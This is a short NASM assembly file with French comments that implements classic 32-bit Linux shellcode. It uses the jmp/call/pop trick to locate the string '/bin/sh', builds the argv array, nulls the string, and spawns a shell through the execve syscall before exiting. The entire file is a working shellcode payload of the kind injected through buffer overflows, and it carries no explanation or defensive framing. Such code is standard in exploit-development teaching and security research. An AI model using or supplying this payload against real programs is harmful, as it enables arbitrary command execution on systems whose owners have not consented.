[bits 32]
[org 0]

    jmp    short after_string
here:
    pop    esi              ; esi = adresse de "/bin/sh"
    mov    [esi+8], esi     ; argv[0] = esi
    xor    eax, eax
    mov    [esi+7], al      ; null byte après "/bin/sh"
    mov    [esi+0xc], eax   ; argv[1] = NULL
    mov    al, 11           ; syscall execve
    mov    ebx, esi         ; path = "/bin/sh"
    lea    ecx, [esi+8]     ; argv
    lea    edx, [esi+0xc]   ; env
    int    0x80
    xor    ebx, ebx
    mov    eax, ebx
    inc    eax               ; eax=1 = exit
    int    0x80
after_string:
    call   here
    db     "/bin/sh"